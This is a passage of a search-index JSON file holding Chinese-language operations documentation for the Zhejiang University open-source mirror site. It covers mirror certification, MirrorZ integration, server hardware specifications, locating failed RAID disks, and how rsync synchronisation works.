\u7b49\u5e38\u7528\u955c\u50cf\uff0c\u6ee1\u8db3\u4e86\u6821\u5185\u5e08\u751f\u65e5\u5e38\u4f7f\u7528\u7684\u9700\u6c42\u3002\u6211\u4eec\u4e5f\u4e3a\u5927\u90e8\u5206\u955c\u50cf\u63d0\u4f9b\u4e86\u5e2e\u52a9\u6587\u6863\uff0c\u5e2e\u52a9\u7528\u6237\u5feb\u901f\u5b8c\u6210\u914d\u7f6e\u3002</p>","tags":["\u4e0d\u5b8c\u5584"]},{"location":"falcon/mirror/#\u6807\u51c6\u5316","title":"\u6807\u51c6\u5316","text":"","tags":["\u4e0d\u5b8c\u5584"]},{"location":"falcon/mirror/#\u955c\u50cf\u83b7\u5f97\u5b98\u65b9\u8ba4\u8bc1","title":"\u955c\u50cf\u83b7\u5f97\u5b98\u65b9\u8ba4\u8bc1","text":"<p>\u6211\u4eec\u79ef\u6781\u4e0e\u4e0a\u6e38\u8054\u7cfb\uff0c\u7533\u8bf7\u6210\u4e3a\u5b98\u65b9\u955c\u50cf\u3002\u76ee\u524d\uff0c\u5df2\u6709 17 \u4e2a\u955c\u50cf\u88ab\u8ba4\u8bc1\u4e3a\u5b98\u65b9\u955c\u50cf\uff0c\u5176\u4e2d\u5305\u62ec Ubuntu\u3001CentOS\u3001ArchLinux\u3001CTAN\u3001ROS \u7b49\u3002\u6210\u4e3a\u5b98\u65b9\u955c\u50cf\uff0c\u8bc1\u660e\u6211\u4eec\u670d\u52a1\u7684\u7a33\u5b9a\u6027\u3001\u5b9e\u65f6\u6027\u3001\u6b63\u786e\u6027\u83b7\u5f97\u4e86\u5b98\u65b9\u7684\u8ba4\u53ef\u3002</p>","tags":["\u4e0d\u5b8c\u5584"]},{"location":"falcon/mirror/#\u63a5\u5165\u6821\u56ed\u7f51\u8054\u5408\u955c\u50cf\u7ad9","title":"\u63a5\u5165\u6821\u56ed\u7f51\u8054\u5408\u955c\u50cf\u7ad9","text":"<p>\u6821\u56ed\u7f51\u8054\u5408\u955c\u50cf\u7ad9\u662f\u7531\u4e2d\u56fd\u6559\u80b2\u548c\u79d1\u7814\u8ba1\u7b97\u673a\u7f51\u7f51\u7edc\u4e2d\u5fc3\u652f\u6301\u7684\u9879\u76ee\uff0c\u5b83\u63d0\u4f9b\u5bf9\u6821\u56ed\u7f51\u955c\u50cf\u7ad9\u7684\u7d22\u5f15\u548c\u8df3\u8f6c\u670d\u52a1\u3002\u6211\u4eec\u5bf9\u63a5\u4e86\u6807\u51c6\u5316\u7684\u63a5\u53e3\uff0c\u5411\u5916\u754c\u66b4\u9732\u6211\u4eec\u5b9e\u65f6\u7684\u8d44\u6e90\u4f7f\u7528\u60c5\u51b5\u548c\u955c\u50cf\u540c\u6b65\u72b6\u6001\u4fe1\u606f\u3002</p>","tags":["\u4e0d\u5b8c\u5584"]},{"location":"falcon/mirror/#\u900f\u660e","title":"\u900f\u660e","text":"<p>\u5982\u679c\u7528\u6237\u5bf9\u955c\u50cf\u540c\u6b65\u7684\u5b9e\u65f6\u6027\u6709\u8d28\u7591\uff0c\u53ef\u4ee5\u8bbf\u95ee\u955c\u50cf\u7ad9\u7f51\u9875\uff0c\u67e5\u770b\u540c\u6b65\u72b6\u6001\u4fe1\u606f\u3002\u5982\u679c\u7528\u6237\u5e0c\u671b\u77e5\u9053\u66f4\u591a\u7684\u7ec6\u8282\uff0c\u53ef\u4ee5\u8bbf\u95ee \u6d59\u5927\u955c\u50cf\u7ad9\u5728\u6821\u56ed\u7f51\u8054\u5408\u955c\u50cf\u7ad9\u4e0a\u7684\u9875\u9762\uff0c\u90a3\u91cc\u6709\u66f4\u8be6\u7ec6\u7684\u540c\u6b65\u72b6\u6001\u4fe1\u606f\u3002</p>","tags":["\u4e0d\u5b8c\u5584"]},{"location":"falcon/mirror/#faq","title":"FAQ","text":"<p>\u6d59\u5927\u955c\u50cf\u7ad9\u76f8\u6bd4\u4e8e \u6e05\u534e TUNA \u955c\u50cf\u7ad9 \u6709\u4ec0\u4e48\u4f18\u52bf\uff1f</p> <ul> <li>\u6d59\u5927\u5185\u7f51\u73af\u5883</li> </ul> <p>\u6211\u4eec\u7684\u670d\u52a1\u5668\u4f4d\u4e8e\u6821\u56ed\u5185\u7f51\u3002\u6839\u636e\u6211\u4eec\u7684\u4e86\u89e3\uff0c\u4e0d\u5c11\u5b9e\u9a8c\u5ba4\u7684\u7f51\u7edc\u5b58\u5728\u516c\u7f51\u8bbf\u95ee\u901f\u5ea6\u6162\u3001\u751a\u81f3\u65e0\u6cd5\u8bbf\u95ee\u516c\u7f51\u7684\u95ee\u9898\u3002\u4f7f\u7528\u6211\u4eec\u6d59\u5927\u81ea\u5df1\u7684\u955c\u50cf\u670d\u52a1\uff0c\u5373\u4f7f\u6ca1\u6709\u516c\u7f51\u8bbf\u95ee\u7684\u6743\u9650\uff0c\u4f9d\u7136\u53ef\u4ee5\u6b63\u5e38\u4f7f\u7528\u955c\u50cf\u3002</p> <ul> <li>\u9ad8\u4f18\u652f\u6301\u6821\u5185\u5e08\u751f</li> </ul> <p>\u6211\u4eec\u4f1a\u59cb\u7ec8\u628a\u652f\u6301\u6821\u5185\u7528\u6237\u653e\u5728\u6700\u9ad8\u4f18\u5148\u7ea7\u3002\u5373\u4f7f\u662f\u4e00\u4e9b\u5c0f\u4f17\u7684\u955c\u50cf\uff0c\u53ea\u8981\u6d59\u5927\u6821\u5185\u5b58\u5728\u5bf9\u8fd9\u4e00\u955c\u50cf\u7684\u7a33\u5b9a\u9700\u6c42\uff0c\u6211\u4eec\u4e00\u5b9a\u4f1a\u8ddf\u8fdb\u3001\u652f\u6301\u3002\u5c31\u5728\u6700\u8fd1\uff0c\u4e00\u4f4d\u6821\u5185\u540c\u5b66\u63d0\u51fa\u4e86\u6dfb\u52a0 ius \u955c\u50cf\u7684\u8bf7\u6c42\u3002\u8fd9\u4e00\u955c\u50cf\u7684\u7528\u6237\u91cf\u975e\u5e38\u5c0f\uff0c\u4f7f\u7528\u573a\u666f\u4e5f\u5c40\u9650\u5728\u65e7\u7684\u53d1\u884c\u7248\u4e2d\u3002\u4f46\u4e86\u89e3\u5230\u8fd9\u4f4d\u540c\u5b66\u7684\u5b9e\u9a8c\u5ba4\u53ea\u80fd\u8bbf\u95ee\u6821\u56ed\u5185\u7f51\uff0c\u800c\u4e14\u5728\u505a\u79d1\u7814\u7684\u8fc7\u7a0b\u4e2d\u786e\u5b9e\u5bf9\u8fd9\u4e00\u955c\u50cf\u6709\u9700\u6c42\uff0c\u6211\u4eec\u5c31\u6ee1\u8db3\u4e86\u8fd9\u4e00\u8bf7\u6c42\u3002\u6b64\u5916\uff0c\u955c\u50cf\u670d\u52a1\u5728\u6821\u5185\u7684\u53ef\u7528\u6027\u4e5f\u662f\u6211\u4eec\u6700\u9ad8\u4f18\u4fdd\u969c\u7684\u3002\u4f7f\u7528\u5176\u4ed6\u5b66\u6821\u7684\u955c\u50cf\u7ad9\uff0c\u53ef\u80fd\u5c31\u4e0d\u4f1a\u4eab\u53d7\u8fd9\u65b9\u9762\u7684\u4f18\u52bf\u3002</p>","tags":["\u4e0d\u5b8c\u5584"]},{"location":"falcon/mirror/#\u57fa\u7840\u77e5\u8bc6","title":"\u57fa\u7840\u77e5\u8bc6","text":"<p>\u5176\u4ed6\u955c\u50cf\u7ad9</p> <p>\u8fd9\u91cc\u63d0\u4f9b\u5176\u4ed6\u955c\u50cf\u7ad9\u7684\u6587\u6863\u6307\u5f15\u3002\u5373\u4f7f\u5177\u4f53\u67b6\u6784\u4e0d\u540c\uff0c\u955c\u50cf\u7ad9\u8fd0\u7ef4\u4ecd\u6709\u5f88\u591a\u7ecf\u9a8c\u53ef\u4ee5\u76f8\u4e92\u53c2\u8003\uff0c\u6211\u4eec\u63d0\u5021\u5f00\u6e90\u5171\u4eab\u7684\u7cbe\u795e\u3002</p> <ul> <li>\u91d1\u67aa\u9c7c\u4e4b\u591c\uff1a2023 \u5e74\u79cb\u5b63\u5b66\u671f\u8fce\u65b0\u4f1a &amp; TUNA \u955c\u50cf\u7ad9\u670d\u52a1\u67b6\u6784\u6f14\u8fdb | \u6e05\u534e\u5927\u5b66 TUNA \u534f\u4f1a</li> <li>\u5f00\u6e90\u955c\u50cf\u7ad9 - LUG @ USTC</li> <li>Home \u00b7 sjtug/mirror-docker-unified Wiki</li> </ul> <p>\u6587\u6863\u7684\u63a5\u4e0b\u6765\u7684\u5185\u5bb9\u9762\u5411\u955c\u50cf\u7ad9\u7231\u597d\u8005\u548c\u8fd0\u7ef4\u4eba\u5458\uff0c\u672c\u8282\u603b\u4f53\u4ecb\u7ecd\u955c\u50cf\u7ad9\u7684\u6784\u6210\u548c\u8fd0\u7ef4\u65b9\u5f0f\u3002</p>","tags":["\u4e0d\u5b8c\u5584"]},{"location":"falcon/mirror/#\u6784\u6210","title":"\u6784\u6210","text":"<ul> <li>\u57fa\u7840\u8bbe\u65bd\uff1a\u955c\u50cf\u7ad9\u7684\u786c\u4ef6\u8bbe\u65bd\u548c\u7f51\u7edc\u73af\u5883\uff0c\u51b3\u5b9a\u4e86\u955c\u50cf\u7ad9\u4e0a\u5c42\u91c7\u7528\u7684\u6280\u672f\u6808\u548c\u8fd0\u7ef4\u65b9\u5f0f\u3002\u5b66\u6821\u95f4\u7684\u5dee\u5f02\u5f88\u5927\uff0c\u4ece\u5355\u673a\u90e8\u7f72\u5230\u4e91\u5e73\u53f0\u90fd\u6709\u3002</li> <li> <p>\u540e\u7aef\uff1a\u8d1f\u8d23\u955c\u50cf\u7ad9\u7684\u6838\u5fc3\u4efb\u52a1\u2014\u2014\u540c\u6b65\u548c\u5b58\u50a8\uff0c\u5b83\u4e3b\u8981\u662f\u4e00\u4e2a\u540c\u6b65\u4efb\u52a1\u8c03\u5ea6\u5668\u3002\u89c4\u6a21\u8f83\u5927\u7684\u955c\u50cf\u7ad9\u51e0\u4e4e\u90fd\u4f1a\u5b9a\u5236\u81ea\u5df1\u7684\u540e\u7aef\uff0c\u4e0b\u9762\u662f\u56fd\u5185\u955c\u50cf\u7ad9\u540e\u7aef\u7b80\u8868\uff1a</p> \u8bed\u8a00 \u540e\u7aef\u5b9e\u73b0 Go tuna/tunasync\u3001sjutg/lug\u3001ustclug/Yuki Python PKUOSC C# ZJUSCT/MirrorManager </li> <li> <p>\u524d\u7aef\uff1a\u8d1f\u8d23\u955c\u50cf\u7ad9\u7684\u8bbf\u95ee\u548c\u7528\u6237\u4ea4\u4e92\u3002\u5b83\u4e3b\u8981\u662f Web \u670d\u52a1\uff0c\u63d0\u4f9b\u4e86\u955c\u50cf\u5217\u8868\u3001\u540c\u6b65\u72b6\u6001\u3001\u5e2e\u52a9\u6587\u6863\u7b49\u529f\u80fd\u3002</p> </li> </ul>","tags":["\u4e0d\u5b8c\u5584"]},{"location":"falcon/mirror/#\u670d\u52a1\u65b9\u5f0f","title":"\u670d\u52a1\u65b9\u5f0f","text":"<p>\u7edd\u5927\u90e8\u5206\u8f6f\u4ef6\u6e90\u4f7f\u7528 HTTP \u63d0\u4f9b\u670d\u52a1\uff0c\u4f8b\u5982 Ubuntu\u3001Debian\u3001ArchLinux\u3001CTAN\u3001ROS \u7b49\u3002</p> <p>\u4e0b\u8868\u662f\u4e00\u4e9b\u4f8b\u5916\uff1a</p> \u670d\u52a1\u65b9\u5f0f \u4e3e\u4f8b Git Homebrew\u3001Linux \u548c glibc \u6e90\u7801\u7b49 FTP \u8fdc\u53e4\u65f6\u671f\u7684\u670d\u52a1\u65b9\u5f0f\uff0cAPT\u3001AUR \u7b49\u90fd\u66fe\u7ecf\u4f7f\u7528\u8fc7 S3 \u6682\u65e0 <p>\u4e00\u4e9b HTTP \u955c\u50cf\u5e76\u4e0d\u662f\u5168\u91cf\u955c\u50cf\uff0c\u800c\u662f\u901a\u8fc7 HTTP \u4ee3\u7406\u7f13\u5b58\u63d0\u4f9b\u670d\u52a1\uff0c\u4f8b\u5982 PyPI\u3001Anaconda \u7b49\u3002</p>","tags":["\u4e0d\u5b8c\u5584"]},{"location":"falcon/mirror/#\u540c\u6b65\u65b9\u5f0f","title":"\u540c\u6b65\u65b9\u5f0f","text":"<ul> <li>\u7edd\u5927\u90e8\u5206\u8f6f\u4ef6\u6e90\u4f7f\u7528 rsync \u540c\u6b65\u3002</li> <li>Git \u6e90\u4f7f\u7528 <code>git remote update</code> \u540c\u6b65\u3002</li> </ul> <p>TUNA \u6536\u5f55\u4e86\u56fd\u5185\u6700\u591a\u7684\u8f6f\u4ef6\u6e90\uff0c\u53ef\u4ee5\u5728 TUNA \u72b6\u6001\u9875 \u770b\u5230\u6700\u4e3a\u5168\u9762\u7684\u955c\u50cf\u540c\u6b65\u65b9\u5f0f\u3002</p>","tags":["\u4e0d\u5b8c\u5584"]},{"location":"falcon/mirror/#\u89c2\u6d4b","title":"\u89c2\u6d4b","text":"<p>\u90e8\u5206\u8f6f\u4ef6\u6e90\u4e3a\u955c\u50cf\u7f51\u7edc\u63d0\u4f9b\u4e86\u4e00\u81f4\u7684\u89c2\u6d4b\u65b9\u5f0f\uff0c\u80fd\u591f\u5e2e\u52a9\u7528\u6237\u548c\u7ba1\u7406\u5458\u4e86\u89e3\u955c\u50cf\u7684\u540c\u6b65\u72b6\u6001\u3002\u4ee5 Debian \u4e3a\u4f8b\uff0c\u6240\u6709\u955c\u50cf\u7ad9\u90fd\u5177\u6709 <code>debian/project/trace</code> \u6587\u4ef6\uff0c\u5728 Debian Mirror Monitoring \u4e2d\u6c47\u603b\u4e86\u6240\u6709\u955c\u50cf\u7ad9\u7684\u72b6\u6001\u3002</p> <p>MirrorZ \u662f\u4e2d\u56fd\u6559\u80b2\u548c\u79d1\u7814\u8ba1\u7b97\u673a\u7f51\u7f51\u7edc\u4e2d\u5fc3\u652f\u6301\u7684\u56fd\u5185\u6821\u56ed\u7f51\u955c\u50cf\u7ad9\u7d22\u5f15\u548c\u8df3\u8f6c\u670d\u52a1\u3002\u5404\u5927\u955c\u50cf\u7ad9\u901a\u8fc7 MirrorZ \u5b9a\u4e49\u7684\u6807\u51c6\u5316\u6570\u636e\u683c\u5f0f\uff0c\u5411\u5916\u754c\u66b4\u9732\u5b9e\u65f6\u7684\u8d44\u6e90\u4f7f\u7528\u60c5\u51b5\u548c\u955c\u50cf\u540c\u6b65\u72b6\u6001\u4fe1\u606f\u3002</p>","tags":["\u4e0d\u5b8c\u5584"]},{"location":"falcon/mirror/#\u57fa\u7840\u8bbe\u65bd","title":"\u57fa\u7840\u8bbe\u65bd","text":"<p>Quote</p> <ul> <li>Support - 02-PCIe network adapter specifications- H3C\uff1a\u65b0\u534e\u4e09\u7f51\u5361\u6570\u636e\u8868\u3002</li> <li>Support - 08-Configuring an H460, P460, P240 or P4408 storage controller- H3C\uff1aRAID \u5361\u914d\u7f6e\u624b\u518c\u3002</li> </ul> <p>\u6d59\u6c5f\u5927\u5b66\u955c\u50cf\u7ad9\u6240\u6709\u7684\u786c\u4ef6\u8d44\u6e90\u90fd\u662f\u7531\u6d59\u5927\u4fe1\u606f\u4e2d\u5fc3\u8d5e\u52a9\u7684\u3002\u955c\u50cf\u7ad9\u5c5e\u4e8e\u4fe1\u606f\u4e2d\u5fc3 \u7814\u5728\u6d59\u5927\u00b7\u79d1\u7814\u8f6f\u4ef6\u5e73\u53f0 \u7684\u4e00\u4e2a\u5b50\u9879\u76ee\u3002</p> <p>2025 \u5e74 4 \u6708 17 \u65e5\uff0c\u6211\u4eec\u4ece\u4fe1\u606f\u6280\u672f\u4e2d\u5fc3\u6536\u5230\u4e86\u65b0\u4e00\u4ee3\u955c\u50cf\u7ad9\u7684\u786c\u4ef6\u8bbe\u65bd\u3002\u65b0\u4e00\u4ee3\u955c\u50cf\u7ad9\u7531 3 \u53f0\u5b58\u50a8\u670d\u52a1\u5668\u30012 \u53f0\u4e1a\u52a1\u670d\u52a1\u5668\u6784\u6210\uff0c\u901a\u8fc7\u4e07\u5146\u4ea4\u6362\u673a\u4e92\u8054\u3002</p> <p></p> <p></p> <p></p>","tags":["\u4e0d\u5b8c\u5584"]},{"location":"falcon/mirror/#\u5b58\u50a8\u670d\u52a1\u5668-h3c-x10536-g3","title":"\u5b58\u50a8\u670d\u52a1\u5668 H3C X10536 G3","text":"\u53c2\u6570 \u503c CPU 2 x Intel Xeon Silver 4110 \u5185\u5b58 8 x 32GB DDR4 2666MHz RDIMM <ul> <li> <p>\u5b58\u50a8\u89c4\u683c\uff1a\u6bcf\u53f0\u914d\u5907 2 \u5f20 H3C P460 RAID \u5361\uff0c\u5177\u6709 4GB \u7f13\u5b58\u548c\u6389\u7535\u4fdd\u62a4\u3002</p> <p>\u5176\u4e0a\u8fde\u63a5\u7684\u5b58\u50a8\u8bbe\u5907\u6709\uff1a</p> \u6570\u91cf \u5bb9\u91cf \u7c7b\u578b \u5177\u4f53\u578b\u53f7 2 600G 12 Gbps SAS HDD \u7cfb\u7edf\u76d8 SEAGATE ST600MM0009 6 480GB 12 Gbps SATA SSD \u6570\u636e\u76d8 Micron 5200 MTFD 30 8TB 12 Gbps SATA HDD \u6570\u636e\u76d8 SEAGATE ST8000NM0055-1RM <p>\u7cfb\u7edf\u76d8\u5df2\u914d\u7f6e\u4e3a RAID1\u3002</p> </li> <li> <p>\u7f51\u7edc\u89c4\u683c\uff1a\u6bcf\u53f0\u914d\u5907 2 \u5f20\u53cc\u53e3 10G \u4ee5\u592a\u7f51\u5361\u548c 1 \u5f20\u53cc 1G \u4ee5\u592a\u7f51\u5361\u3002</p> \u63d2\u69fd \u7f51\u5361\u578b\u53f7 \u89c4\u683c \u63a7\u5236\u5668 \u677f\u8f7d NIC-GE-2P-360T-B2-1-X 2 x 1GE RJ45 Intel NHI350AM PCIe CNA-10GE-2P-560F-B2-1 2 x 10GE SFP Intel JL82599 FLOM NIC-10GE-2P-560F-LOM 2 x 10GE SFP Intel JL82599 </li> </ul>","tags":["\u4e0d\u5b8c\u5584"]},{"location":"falcon/mirror/#\u4e1a\u52a1\u670d\u52a1\u5668-h3c-r4900-g3","title":"\u4e1a\u52a1\u670d\u52a1\u5668 H3C R4900 G3","text":"\u53c2\u6570 \u503c CPU 2 x Intel Xeon Gold 6130 \u5185\u5b58 6 x 16GB DDR4 2666MHz RDIMM <ul> <li> <p>\u5b58\u50a8\u89c4\u683c\uff1a\u6bcf\u53f0\u914d\u5907 1 \u5f20 H3C P460 RAID \u5361\uff0c\u5177\u6709 4GB \u7f13\u5b58 \u548c\u6389\u7535\u4fdd\u62a4\u3002</p> <p>\u5176\u4e0a\u8fde\u63a5\u7684\u5b58\u50a8\u8bbe\u5907\u6709\uff1a</p> \u6570\u91cf \u5bb9\u91cf \u7c7b\u578b \u5177\u4f53\u578b\u53f7 2 600G 12 Gbps SAS HDD \u7cfb\u7edf\u76d8 SEAGATE ST600MM0009 <p>\u7cfb\u7edf\u76d8\u5df2\u914d\u7f6e\u4e3a RAID1\u3002</p> </li> <li> <p>\u7f51\u7edc\u89c4\u683c\uff1a\u6bcf\u53f0\u914d\u5907 1 \u5f20\u53cc\u53e3 10G \u4ee5\u592a\u7f51\u5361\u3002</p> \u63d2\u69fd \u7f51\u5361\u578b\u53f7 \u89c4\u683c \u63a7\u5236\u5668 PCIe NIC-BCM957302-F-B-10Gb-2P 2 x 10GE SFP Broadcom BCM57302 </li> </ul>","tags":["\u4e0d\u5b8c\u5584"]},{"location":"falcon/mirror/#\u4ea4\u6362\u673a-h3c-s6520x-24st-si","title":"\u4ea4\u6362\u673a H3C S6520X-24ST-SI","text":"\u53c2\u6570 \u503c \u524d\u9762\u677f\u4e1a\u52a1\u7aef\u53e3\u63cf\u8ff0 24 \u4e2a 1/2.5/10GE SFP Plus \u7aef\u53e3\uff082 \u4e2a Combo 1G/2.5G/5G/10G Base-T \u81ea\u9002\u5e94\u4ee5\u592a\u7f51\u7aef\u53e3\uff09 \u4ea4\u6362\u5bb9\u91cf 2.56Tbps/25.6Tbps \u5305\u8f6c\u53d1\u7387 360Mpps \u94fe\u8def\u805a\u5408 \u652f\u6301 10GE \u7aef\u53e3\u805a\u5408","tags":["\u4e0d\u5b8c\u5584"]},{"location":"falcon/mirror/#\u5b9a\u4f4d\u635f\u574f\u7684\u78c1\u76d8","title":"\u5b9a\u4f4d\u635f\u574f\u7684\u78c1\u76d8","text":"<p>\u955c\u50cf\u7ad9\u78c1\u76d8\u635f\u574f\u5e94\u5f53\u8054\u7cfb\u4fe1\u606f\u4e2d\u5fc3\u8fdb\u884c\u66f4\u6362\u3002\u6211\u4eec\u9700\u8981\u8d1f\u8d23\u5b9a\u4f4d\u635f\u574f\u7684\u78c1\u76d8\uff0c\u5c06\u4fe1\u606f\u53cd\u9988\u7ed9\u4fe1\u606f\u4e2d\u5fc3\u3002</p> <ul> <li>\u5982\u679c\u662f\u76f4\u901a\u76d8\uff0c\u5219\u4f7f\u7528 <code>hwinfo --disk</code> \u53ef\u4ee5\u770b\u5230 Model \u548c Serial Number\uff0c\u636e\u6b64\u53bb IPMI \u7684 Storage \u9009\u9879\u5361\u641c\u7d22\u5373\u53ef\u3002</li> <li>\u5982\u679c\u662f\u903b\u8f91\u5377\uff1a<ul> <li>RAID \u5361\u68c0\u6d4b\u5230\u574f\u76d8\u540e\uff0c\u4f1a\u5728 IPMI \u4e2d\u6807\u8bb0\u903b\u8f91\u5377\u72b6\u6001\u4e3a <code>Failed</code>\uff0c\u53ef\u76f4\u63a5\u5b9a\u4f4d\u3002</li> <li> <p>RAID \u5361\u5c1a\u672a\u68c0\u6d4b\u5230\u78c1\u76d8\u635f\u574f\uff0c\u800c\u7cfb\u7edf\u62a5\u9519\uff0c\u5219\u53ef\u4ee5\u6839\u636e SysFS \u8def\u5f84\u8fdb\u884c\u5b9a\u4f4d\u3002\u4ee5\u4e0b\u9762\u7684\u8def\u5f84\u4e3a\u4f8b\uff1a</p> <pre><code>// \u5185\u6838\u65e5\u5fd7\uff0c\u51fa\u73b0\u8be5\u65e5\u5fd7\u7684\u65f6\u5019\u63a7\u5236\u5668\u5df2\u68c0\u6d4b\u5230\u78c1\u76d8\u635f\u574f\uff0c\u4f1a\u76f4\u63a5\u6389\u76d8\ntag#741 received 'logical unit failure' from controller for scsi 14:1:0:9\n// hwinfo \u4fe1\u606f\nSysFS BusID: 14:1:0:9\nSysFS Device Link: /devices/pci0000:3a/0000:3a:00.0/0000:3b:00.0/host14/target14:1:0/14:1:0:9\n</code></pre> <p>\u5c06 BusID \u7684\u5b57\u6bb5\u5206\u4e3a 0~3\u3002</p> \u5b57\u6bb5 \u89e3\u91ca 0 \u63a7\u5236\u5668\u7f16\u53f7 1 \u8bbe\u5907\u7c7b\u578b\uff0c\u903b\u8f91\u5377\u4e3a <code>1</code>\uff0c\u76f4\u901a\u76d8\u4e3a <code>0</code> 2 \u76f4\u901a\u76d8\u5e8f\u53f7 3 \u903b\u8f91\u5377\u5e8f\u53f7 <p>\u6bd4\u5982\u4e0a\u9762\u7684\u8bbe\u5907\u4e3a\u903b\u8f91\u5377 9\uff0c\u53ef\u4ee5\u5728 IPMI \u4e2d\u627e\u5230\u5bf9\u5e94\u7684\u903b\u8f91\u5377\u3002</p> </li> </ul> </li> </ul>","tags":["\u4e0d\u5b8c\u5584"]},{"location":"falcon/mirror/#\u540e\u7aef","title":"\u540e\u7aef","text":"","tags":["\u4e0d\u5b8c\u5584"]},{"location":"falcon/mirror/#\u524d\u7aef","title":"\u524d\u7aef","text":"","tags":["\u4e0d\u5b8c\u5584"]},{"location":"falcon/mirror/#\u8f6f\u4ef6\u6e90\u548c\u540c\u6b65\u5de5\u5177","title":"\u8f6f\u4ef6\u6e90\u548c\u540c\u6b65\u5de5\u5177","text":"<p>\u672c\u8282\u603b\u7ed3\u8f6f\u4ef6\u6e90\u7684\u683c\u5f0f\u548c\u5e03\u5c40\u3001\u4f7f\u7528\u7684\u540c\u6b65\u5de5\u5177\u3001\u540c\u6b65\u4e2d\u7684\u95ee\u9898\u7b49\u5185\u5bb9\uff0c\u4f9b\u955c\u50cf\u7ef4\u62a4\u8005\u53c2\u8003\u3002</p>","tags":["\u4e0d\u5b8c\u5584"]},{"location":"falcon/mirror/#rsync","title":"rsync","text":"<p><code>rsync</code> \u662f\u955c\u50cf\u540c\u6b65\u7684\u6838\u5fc3\u5de5\u5177\u3002\u4f5c\u4e3a\u955c\u50cf\u7ad9\u7684\u7ef4\u62a4\u8005\uff0c\u4e86\u89e3 <code>rsync</code> \u7684\u5de5\u4f5c\u539f\u7406\u3001\u6027\u80fd\u74f6\u9888\u548c\u5e38\u7528\u9009\u9879\u662f\u975e\u5e38\u91cd\u8981\u7684\u3002\u5efa\u8bae\u9605\u8bfb\u4e0b\u9762\u4e24\u7bc7\u6587\u7ae0\uff1a</p> <ul> <li>How Rsync Works\uff1aRsync \u5b98\u65b9\u7684\u4ecb\u7ecd\u3002</li> <li>rsync, article 3: How does rsync work? (2022) - Michael Stapelberg\uff1a\u4ecb\u7ecd\u4e86 Rsync Protocol v27 \u7684\u5de5\u4f5c\u539f\u7406\uff0c\u7279\u522b\u662f\u63a2\u7a76\u4e86\u540c\u6b65\u8fc7\u7a0b\u4e2d\u6e90/\u76ee\u7684\u6570\u636e\u53d1\u751f\u53d8\u5316\u7684\u60c5\u51b5\u3002</li> </ul> <p>\u4e0b\u9762\u662f\u4ece\u8fd9\u4e9b\u6587\u7ae0\u4e2d\u603b\u7ed3\u51fa\u7684\u8981\u70b9\uff1a</p> <ul> <li> <p>\u4e24\u4e2a\u89d2\u8272\uff1aReceiver \u548c Sender\u3002\u81f3\u4e8e Client \u548c Server\uff0c\u53ea\u8981 Rsync \u53cc\u65b9\u8fde\u63a5\u5efa\u7acb\uff0c\u5c31\u4e0d\u518d\u533a\u5206\u3002</p> <p>\u4ee5 Rsync Pull \u4e3a\u4f8b\uff1a</p> <pre><code>rsync rsync://HOST/SRC... [DEST]\n</code></pre> <p>\u8fdc\u7a0b\u4e3b\u673a\u662f Sender\uff0c\u672c\u673a\u662f Receiver\u3002</p> <p>\u4e00\u65e6\u5efa\u7acb\u8fde\u63a5\uff0cSender \u904d\u5386\u81ea\u5df1\u7684\u6587\u4ef6\u7cfb\u7edf\uff0c\u5c06\u6587\u4ef6\u5217\u8868\u53d1\u9001\u7ed9 Receiver\u3002</p> <p>Receiver \u63a5\u6536\u5b8c\u6587\u4ef6\u5217\u8868\u540e\uff0cfork \u51fa Generator\uff0c\u5f00\u59cb\u4e0b\u9762\u7684\u6d41\u6c34\u7ebf\u3002</p> </li> <li> <p>\u6d41\u6c34\u7ebf\uff1aGenerator -&gt; Sender -&gt; Receiver</p> <ul> <li> <p>Generator\uff1a\u5bf9\u6bd4\u6587\u4ef6\u5217\u8868\u548c\u672c\u5730\u6587\u4ef6\u6811\uff0c\u6267\u884c\u5220\u9664\u3001\u8df3\u8fc7\u3001\u521b\u5efa\u6587\u4ef6\u5939\u7b49\u64cd\u4f5c\u3002</p> <p>\u9047\u5230\u4e0d\u80fd\u8df3\u8fc7\uff08\u9700\u8981\u540c\u6b65\uff09\u7684\u6587\u4ef6\u65f6\uff0c\u5c06\u6587\u4ef6\u5206\u5757\uff0c\u751f\u6210\u6821\u9a8c\u548c\uff0c\u548c\u6587\u4ef6\u7d22\u5f15\u4e00\u8d77\u53d1\u9001\u7ed9 Sender\u3002</p> <p>\u8be5\u672c\u5730\u6587\u4ef6\u5c06\u4f5c\u4e3a Base file\uff0cSender \u63a5\u4e0b\u6765\u4f7f\u7528 Rsync \u7b97\u6cd5\u627e\u5230\u4e0e\u4e4b\u7684\u5dee\u5f02\u3002</p> </li> <li> <p>Sender\uff1a\u6eda\u52a8\u6821\u9a8c\u548c\uff08Rolling Checksum\uff09</p> <p>Sender \u91c7\u7528\u7c7b\u4f3c\u6ed1\u52a8\u7a97\u53e3\u7684\u7b56\u7565\uff0c\u9010\u5b57\u8282\u626b\u63cf\u672c\u5730\u6587\u4ef6\u751f\u6210\u5757\u6821\u9a8c\u548c\u3002\u5982\u679c\u67d0\u4e00\u5757\u6821\u9a8c\u548c\u5339\u914d\uff0c\u8bf4\u660e\u8be5\u5757\u4e0d\u7528\u540c\u6b65\uff0c\u8df3\u8fc7\u8be5\u5757\u5e76\u4ece\u8be5\u5757\u7684\u4e0b\u4e00\u4e2a\u5b57\u8282\u5f00\u59cb\u7ee7\u7eed\u626b\u63cf\u3002</p> <p>\u6700\u7ec8 Sender \u5c06\u544a\u8bc9 Receiver \u4ece Basefile \u62f7\u8d1d\u54ea\u4e9b\u6587\u4ef6\u5757\u3001\u5982\u4f55\u91cd\u5efa\u6587\u4ef6\u3001\u91cd\u5efa\u540e\u6587\u4ef6\u7684\u6821\u9a8c\u548c\u3002</p> </li> <li> <p>Receiver\uff1a</p> <p>\u521b\u5efa\u4e34\u65f6\u6587\u4ef6\uff0c\u4ece Basefile \u62f7\u8d1d\u6587\u4ef6\u5757\uff0c\u5e76\u4ece Sender \u63a5\u6536\u6587\u4ef6\u5757\uff0c\u91cd\u7ec4\u6587\u4ef6\u3002\u91cd\u7ec4\u540e\u5bf9\u6bd4\u6821\u9a8c\u548c\u3002</p> <p>\u6210\u529f\u540c\u6b65\u540e\uff0c\u8bbe\u7f6e\u6587\u4ef6\u6743\u9650\uff0c\u91cd\u547d\u540d\u4ee5\u66ff\u6362\u539f\u6587\u4ef6\u3002</p> </li> </ul> </li> <li> <p>\u8d44\u6e90\u6d88\u8017\uff1a</p> <ul> <li>Sender \u6d88\u8017 CPU \u8d44\u6e90</li> <li>Receiver \u6d88\u8017 IO \u8d44\u6e90</li> </ul> </li> <li> 